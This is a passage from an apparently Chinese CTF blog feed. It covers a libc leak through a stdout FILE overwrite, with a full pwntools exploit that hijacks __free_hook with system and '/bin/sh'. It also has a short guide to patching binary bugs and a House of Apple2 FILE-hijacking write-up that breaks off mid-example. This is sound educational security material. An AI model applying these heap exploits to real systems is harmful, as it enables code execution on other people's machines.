href="https://blog.csdn.net/qq_41202237/article/details/113845320">博客</a></p><p><strong>简言之</strong></p><p>想办法写入 IO_2_1_stdout（一般是利用 unsortedbin ）,让_flags &#x3D; 0xFBAD1800，然后让后面的三个read参数为0,让write_base为’\x00’</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250319202959193.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250319202959193.png" alt="image-20250319202959193"></a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/CISCN2025%E5%8D%8A%E5%86%B3%E8%B5%9B/typo.zip">附件</a></p><p>题目就是一个格式化字符串造成的堆溢出，可以用这个堆溢出实现对下一个堆的控制</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250319204659027.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250319204659027.png" alt="image-20250319204659027"></a></p><p>但是要注意的一点是注意\x00d的截断效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnpy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url = url , filename = filename , gdbscript = gdbscript)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1. Add a card                                                                                                                                                                      </span><br><span class="hljs-string">2. Delete a card</span><br><span class="hljs-string">3. Edit a card</span><br><span class="hljs-string">4. Exit</span><br><span class="hljs-string">&gt;&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span> , <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&quot;New size of content: &quot;</span> , size)<br>  p.sendafter(<span class="hljs-string">&quot;What do you want to say: &quot;</span> , content)<br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span> , <span class="hljs-number">6</span>) :<br>  add(i , <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">6</span> , <span class="hljs-number">0x150</span>)<br>add(<span class="hljs-number">7</span> , <span class="hljs-number">0x10</span>)<br><br>edit(<span class="hljs-number">0</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x431</span>) , <span class="hljs-string">b&#x27;aa&#x27;</span>)<br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">4</span>) <span class="hljs-comment">#4</span><br>free(<span class="hljs-number">3</span>) <span class="hljs-comment">#3</span><br><br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0x110</span>) <span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">1</span> , <span class="hljs-string">b&#x27;aaa&#x27;</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0x200</span>))<br>edit(<span class="hljs-number">2</span> , <span class="hljs-string">b&#x27;aaa&#x27;</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x361</span>) + <span class="hljs-string">b&#x27;\x90\x26&#x27;</span>)<br><br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x80</span>) <span class="hljs-comment">#4</span><br><br>edit(<span class="hljs-number">4</span> , <span class="hljs-string">b&#x27;aaa&#x27;</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment">#绕过防护，使用stdout泄露libc</span><br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ec980</span><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">1</span> , <span class="hljs-string">b&#x27;aaa&#x27;</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x91</span>) + p64(free_hook - <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-string">b&#x27;aaa&#x27;</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(system_addr))<br>edit(<span class="hljs-number">1</span> , <span class="hljs-string">b&#x27;aaa&#x27;</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-comment"># free(2)</span><br><br>lss(<span class="hljs-string">&quot;free_hook&quot;</span>)<br>lss(<span class="hljs-string">&quot;system_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stdout泄露libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞fix简明教程</title>
    <link href="/2025/03/14/%E6%BC%8F%E6%B4%9Efix%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"/>
    <url>/2025/03/14/%E6%BC%8F%E6%B4%9Efix%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞fix简明教程"><a href="#漏洞fix简明教程" class="headerlink" title="漏洞fix简明教程"></a>漏洞fix简明教程</h1><h2 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h2><p>直接限制输入大小，非常简单不过多介绍</p><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>把printf函数改为puts函数，比较简单。但是puts函数与printf函数还是有一点点区别的，因为puts函数是自动在输出的字符串尾部加入一个回车符，在有些比赛的check脚本中是通过比较两次输入与输出是否全等，就会导致这种patch方法不能过关。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>给printf函数添加参数</strong></p><p>首先需要在.eh_frame写入参数%s</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314135953219.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314135953219.png" alt="image-20250314135953219"></a></p><p>然后改变printf参数</p><p><strong>改变前</strong></p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314140046965.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314140046965.png" alt="image-20250314140046965"></a></p><p><strong>改变后</strong></p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314140146839.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314140146839.png" alt="image-20250314140146839"></a></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">主要思路就是改变前第一个参数<span class="hljs-built_in">rdi</span>改为<span class="hljs-built_in">rsi</span>，再通过<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span> , <span class="hljs-number">0</span><span class="hljs-comment">;这个命令的位置，给rdi参数赋值，mov rdi，offset %s_addr</span><br><br>X86ASM<br></code></pre></td></tr></table></figure><h2 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h2><h2 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h2><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>跳转到.eh_frame段，布置代码进行指针清空，但是需要.eh_frame可执行权限</p><p><strong>修复前</strong></p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314163937040.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314163937040.png" alt="image-20250314163937040"></a></p><p><strong>修复后</strong></p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314164009351.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314164009351.png" alt="image-20250314164009351"></a></p><p>取下标的操作和原函数保持一致就行</p><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p><strong>直接重写free操作</strong></p><p><strong>修复前</strong></p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314170432801.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314170432801.png" alt="image-20250314170432801"></a></p><p><strong>修复后</strong></p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314170508871.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250314170508871.png" alt="image-20250314170508871"></a></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs X86ASM"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_4]  <span class="hljs-comment">; 取idx</span><br><span class="hljs-keyword">shl</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">3</span>                      <span class="hljs-comment">; idx 乘以 8</span><br><span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">0x4060</span>]     <span class="hljs-comment">; 取 heap_list 的地址</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span>                    <span class="hljs-comment">; 计算索引的地址</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rdx</span>                        <span class="hljs-comment">; 将堆指针 压到stack 上</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,[<span class="hljs-built_in">rdx</span>]                   <span class="hljs-comment">; 取heap地址</span><br><span class="hljs-keyword">call</span> _free                      <span class="hljs-comment">; free heap ;ret 后 rdi 寄存器是空的</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span>                         <span class="hljs-comment">; 取出指向heap的指针</span><br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">rdi</span>                  <span class="hljs-comment">; 清空指针的内容</span><br><br><br></code></pre></td></tr></table></figure><p>这种方法比较万能，但是比较吃字节控制</p><h2 id="Off-By-One漏洞"><a href="#Off-By-One漏洞" class="headerlink" title="Off-By-One漏洞"></a>Off-By-One漏洞</h2>]]></content>
    
    
    <categories>
      
      <category>杂记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN漏洞修补</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House-of-apple2攻击</title>
    <link href="/2025/03/13/House-of-apple2%E6%94%BB%E5%87%BB/"/>
    <url>/2025/03/13/House-of-apple2%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-apple2攻击"><a href="#House-of-apple2攻击" class="headerlink" title="House-of-apple2攻击"></a>House-of-apple2攻击</h1><p><strong>House of apple</strong>系列是有山海关的大佬Roderick开发的IO利用方式，统共有apple1,apple2,apple3三种调用方式。</p><p>这篇文章我们主要讲讲apple2这一利用方式</p><h2 id="背景知识："><a href="#背景知识：" class="headerlink" title="背景知识："></a>背景知识：</h2><p>在libc2.35及以后，glibc将许多的hook都给移除了,包括但不限于<strong>malloc_hook</strong>,<strong>free_hook</strong>等，这也是为什么2.35称为pwn的寒冬，低版本的许多利用方式几乎都失效了。到了2.35及以后，堆利用便离不开对 _IO_FILE 的伪造和对 IO 流的劫持</p><h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><p>house of apple2可以说是高版本中所需利用条件最少的攻击方式</p><ol><li>能够刷新IO流，换言之就是从main函数返回，或者从exit函数退出</li><li>能够泄露libc基址和heap地址</li><li>使用一次largebin attack既可</li></ol><p>只用一次largebin attack在高版本的利用中是相当少见的，这也意味着house of apple2可以在更多的限制下来展开攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs BASH">pwndbg&gt; p *_IO_list_all<br><span class="hljs-variable">$1</span> = &#123;<br>  file = &#123;<br>    _flags = -72540026,<br>    _IO_read_ptr = 0x0,<br>    _IO_read_end = 0x0,<br>    _IO_read_base = 0x0,<br>    _IO_write_base = 0x0,<br>    _IO_write_ptr = 0x0,<br>    _IO_write_end = 0x0,<br>    _IO_buf_base = 0x0,<br>    _IO_buf_end = 0x0,<br>    _IO_save_base = 0x0,<br>    _IO_backup_base = 0x0,<br>    _IO_save_end = 0x0,<br>    _markers = 0x0,<br>    _chain = 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;,<br>    _fileno = 2,<br>    _flags2 = 0,<br>    _old_offset = -1,<br>    _cur_column = 0,<br>    _vtable_offset = 0 <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = 0x7ffff7e1ca60 &lt;_IO_stdfile_2_lock&gt;,<br>    _offset = -1,<br>    _codecvt = 0x0,<br>    _wide_data = 0x7ffff7e1a8a0 &lt;_IO_wide_data_2&gt;,#这是我们需要劫持的成员<br>    _freeres_list = 0x0,<br>    _freeres_buf = 0x0,<br>    __pad5 = 0,<br>    _mode = 0,<br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;,<br>  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>house of apple2主要是通过伪造FILE结构体来完成攻击，而在2.24以后的glibc中，FILE结构体中的Vtable指针不能被劫持到任意地址，会有一个IO_validate_vtable函数对其指向的地址进行检测，下面是它的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>而house of apple2主要针对的是_IO_FILE中的__wide_data成员，_wide_data指向的结构体是一个和FILE结构体十分相像的wide_data结构体，下面是他的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs BASH">pwndbg&gt; p _IO_wide_data_2<br><span class="hljs-variable">$2</span> = &#123;<br>  _IO_read_ptr = 0x0,<br>  _IO_read_end = 0x0,<br>  _IO_read_base = 0x0,<br>  _IO_write_base = 0x0,<br>  _IO_write_ptr = 0x0,<br>  _IO_write_end = 0x0,<br>  _IO_buf_base = 0x0,<br>  _IO_buf_end = 0x0,<br>  _IO_save_base = 0x0,<br>  _IO_backup_base = 0x0,<br>  _IO_save_end = 0x0,<br>  _IO_state = &#123;<br>    __count = 0,<br>    __value = &#123;<br>      __wch = 0,<br>      __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>    &#125;<br>  &#125;,<br>  _IO_last_state = &#123;<br>    __count = 0,<br>    __value = &#123;<br>      __wch = 0,<br>      __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>    &#125;<br>  &#125;,<br>  _codecvt = &#123;<br>    __cd_in = &#123;<br>      step = 0x0,<br>      step_data = &#123;<br>        __outbuf = 0x0,<br>        __outbufend = 0x0,<br>        __flags = 0,<br>        __invocation_counter = 0,<br>        __internal_use = 0,<br>        __statep = 0x0,<br>        __state = &#123;<br>          __count = 0,<br>          __value = &#123;<br>            __wch = 0,<br>            __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    __cd_out = &#123;<br>      step = 0x0,<br>      step_data = &#123;<br>        __outbuf = 0x0,<br>        __outbufend = 0x0,<br>        __flags = 0,<br>        __invocation_counter = 0,<br>        __internal_use = 0,<br>        __statep = 0x0,<br>        __state = &#123;<br>          __count = 0,<br>          __value = &#123;<br>            __wch = 0,<br>            __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;,<br>  _shortbuf = L<span class="hljs-string">&quot;&quot;</span>,<br>  _wide_vtable = 0x7ffff7e170c0 &lt;_IO_wfile_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="调用链介绍-IO-wfile-overflow"><a href="#调用链介绍-IO-wfile-overflow" class="headerlink" title="调用链介绍-_IO_wfile_overflow"></a>调用链介绍-_IO_wfile_overflow</h2><p>下面是我们可以开展攻击的一条调用链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">_IO_wfile_overflow --&gt; _IO_wdoallocbuf --&gt; _IO_WDOALLOCATE<br></code></pre></td></tr></table></figure><p>下面我们介绍一下这条调用链的由来</p><p>在程序执行exit退出时，会刷新FILE结构体里面的所有内容</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313142628518.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313142628518.png" alt="image-20250313142628518"></a></p><p>在刷新FILE结构体的时候会执行执行**_IO_flush_all_lockp**函数</p><p>在这个过程中会调用到**_IO_wfile_overflow**函数</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313142717377.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250313142717377.png" alt="image-20250313142717377"></a></p><p>而在调用_IO_wfile_overflow函数的时候，会调用到<strong>IO_wdoallocbuf</strong>函数，我们来看看这个函数的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_wdoallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="hljs-comment">//</span><br>      <span class="hljs-keyword">return</span>;<br>  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,<br>             fp-&gt;_wide_data-&gt;_shortbuf + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (_IO_wdoallocbuf)<br><br></code></pre></td></tr></table></figure><p>里面就会执行到_IO_WDOALLOCATE函数，而这个函数就是我们要劫持的函数</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>利用largebin attack向IO_list_all里面写入一个可控的堆地址</li><li>在这个堆块里面同时伪造一个_IO_list_all结构体和IO_wide_data结构体，以及他们对应的vtable指针</li><li>_IO_list_all结构体的vtable指针指向 _IO_wfile_jumps来绕过检查，而 _wide_data的结构体指向我们伪造的虚表即可</li></ol><p>关于需要绕过的检查，在Roderick师傅的原帖可见，介绍的十分的详细，这里不过多赘述，有需要注意的点会在例题中详细介绍，膜拜一下Roderick师傅</p><h2 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h2><p>下面是例题的源码，编译的版本是2.35，libc版本是<strong>Ubuntu GLIBC 2.35-0ubuntu3.8</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 